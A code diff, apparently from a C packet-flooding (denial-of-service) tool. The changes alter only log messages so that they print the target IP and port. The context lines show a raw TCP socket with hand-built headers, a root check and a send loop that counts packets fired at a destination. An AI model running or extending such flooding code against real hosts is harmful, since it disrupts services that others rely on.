@@ -72,7 +72,7 @@ void Flood(const char* destinationIP)
     srand(time(0));                
     signal(SIGINT, InterruptHandler);
 
-    printf("[DATA] Flood is starting...\n");
+    printf("[DATA: %s] Flood is starting...\n", destinationIP);
 
     int socketFD = socket(PF_INET, SOCK_RAW, IPPROTO_TCP);
     char datagram[4096];
@@ -122,13 +122,13 @@ void Flood(const char* destinationIP)
     if (setsockopt(socketFD, IPPROTO_IP, IP_HDRINCL, 
                    value, sizeof(tempOne)) < 0)
     {
-        printf("[ERR] number : %d  Error message : %s \n", 
-               errno, strerror(errno));
+        printf("[ERR: %s] number : %d  Error message : %s \n", 
+               destinationIP, errno, strerror(errno));
         fprintf(stderr, "Program needs to be run by root user\n");
         exit(-1);
     }
 
-    printf("[DATA] attacking ip %s on port %d...\n", 
+    printf("[DATA: %s@%d] attacking...\n", 
            destinationIP, destinationPort);
 
     while (isSending) 
@@ -150,7 +150,7 @@ void Flood(const char* destinationIP)
                    (struct sockaddr*) &socketAddressInput, 
                    sizeof(socketAddressInput)) < 0) 
         {
-            printf("\n[ERR] Program terminated\n");
+            printf("\n[ERR: %s] Program terminated\n", destinationIP);
             exit(0);
         } else packetCount++;
     }
